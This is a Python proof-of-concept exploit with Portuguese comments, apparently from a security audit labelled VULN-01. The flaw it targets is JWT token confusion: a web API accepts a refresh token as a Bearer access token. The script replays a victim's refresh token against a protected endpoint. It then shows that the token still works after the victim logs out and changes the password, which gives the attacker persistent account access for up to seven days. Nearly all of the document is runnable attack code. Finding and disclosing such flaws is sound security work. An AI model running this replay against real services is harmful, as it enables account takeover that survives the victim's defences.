#!/usr/bin/env python3
"""
PoC — VULN-01: Confusão de tokens JWT (refresh token aceite como access token).

Cenário:
  1. A vítima faz login e obtém (access_token, refresh_token).
  2. Um atacante que obteve o refresh_token (XSS / MitM / log leak) NÃO o gasta
     em /auth/refresh (que o rodaria). Em vez disso, usa-o como Bearer num
     endpoint protegido por JwtAuthGuard. O JwtStrategy valida a assinatura
     RS256, NÃO há jti no refresh token => o check de revogação Redis é saltado
     => o token é aceite como access token.
  3. PERSISTÊNCIA: a vítima faz logout legítimo E altera a password. Ambas as
     operações revogam apenas a linha de sessão e o accessTokenJti no Redis.
     A assinatura RS256 do refresh token NÃO é invalidada. O atacante continua
     autenticado por até 7 dias usando o refresh token como Bearer.

Uso:
  BASE_URL=http://localhost:3000 \
  VICTIM_EMAIL=victim@example.com \
  VICTIM_PASSWORD='SenhaForte123' \
  python poc-vuln-01.py

Requisitos: pip install requests
"""

import os
import sys
import requests

BASE_URL = os.getenv("BASE_URL", "http://localhost:3000").rstrip("/")
EMAIL = os.getenv("VICTIM_EMAIL", "victim@example.com")
PASSWORD = os.getenv("VICTIM_PASSWORD", "SenhaForte123!")

sess = requests.Session()


def banner(t: str) -> None:
    print("\n" + "=" * 70)
    print(f"  {t}")
    print("=" * 70)


def assert_bearer_works(token: str, label: str, route: str = "/auth/logout", body=None) -> bool:
    """Tenta usar `token` como Bearer num endpoint protegido por JwtAuthGuard."""
    r = sess.post(
        f"{BASE_URL}{route}",
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        },
        json=body if body is not None else {"refresh_token": token},
        timeout=10,
    )
    accepted = r.status_code != 401 and r.status_code != 403
    print(f"[{label}] {route} -> HTTP {r.status_code}  "
          f"{'<<< ACEITE (refresh usado como access)' if accepted else '(rejeitado)'}")
    return accepted


def main() -> int:
    banner("PASSO 1 — Login legitimo da vitima")
    r = sess.post(
        f"{BASE_URL}/auth/login",
        json={"email": EMAIL, "password": PASSWORD},
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    if r.status_code != 200:
        print(f"Login falhou: HTTP {r.status_code} {r.text}")
        return 2
    body = r.json()
    access = body["access_token"]
    refresh = body["refresh_token"]
    print(f"access_token  (len={len(access)}, exp 15m)")
    print(f"refresh_token (len={len(refresh)}, exp 7d)  <-- alvo do ataque")

    banner("PASSO 2 — Ataque: usar REFRESH token como ACCESS token")
    print("Endpoint protegido por JwtAuthGuard: POST /auth/logout")
    accepted = assert_bearer_works(refresh, "ATAQUE-1", "/auth/logout")
    if not accepted:
        print("\n[-] O refresh token foi rejeitado como access token. "
              "A vulnerabilidade NAO existe (ou ja foi corrigida).")
        return 1

    print("\n[+] CONFIRMADO: o refresh token passa o JwtStrategy como access token.")

    banner("PASSO 3 — Persistencia pos logout + password change")
    print("A vitima deteta atividade suspeita e reage:")
    # (a) logout legitimo usando o access token verdadeiro
    r1 = sess.post(
        f"{BASE_URL}/auth/logout",
        headers={"Authorization": f"Bearer {access}",
                 "Content-Type": "application/json"},
        json={"refresh_token": refresh}, timeout=10,
    )
    print(f"(a) logout legitimo          -> HTTP {r1.status_code}")

    # (b) change-password (revoga TODAS as sessoes + JTIs conhecidos)
    new_pw = PASSWORD + "_X9"
    r2 = sess.post(
        f"{BASE_URL}/auth/change-password",
        headers={"Authorization": f"Bearer {access}",
                 "Content-Type": "application/json"},
        json={"currentPassword": PASSWORD, "newPassword": new_pw}, timeout=10,
    )
    print(f"(b) change-password legitimo -> HTTP {r2.status_code}")

    banner("PASSO 4 — O atacante AINDA consegue usar o refresh como access?")
    still = assert_bearer_works(refresh, "ATAQUE-2-pos-defesa", "/auth/logout")
    if still:
        print("\n[+] CONFIRMADO VULN-01 (CRITICA): o refresh token roubado mantem-se")
        print("    valido como access token MESMO APOS logout + password change.")
        print("    Apenas a expiracao natural de 7 dias o mata. Logout/password-change")
        print("    NAO revogam a assinatura RS256 do refresh token.")
        return 0
    else:
        print("\n[?] Pos-defesa rejeitou o token. A vulnerabilidade de persistencia")
        print("    pode ter sido mitigada (mas o Ataque-1 ja confirmou a confusao).")
        return 0


if __name__ == "__main__":
    sys.exit(main())
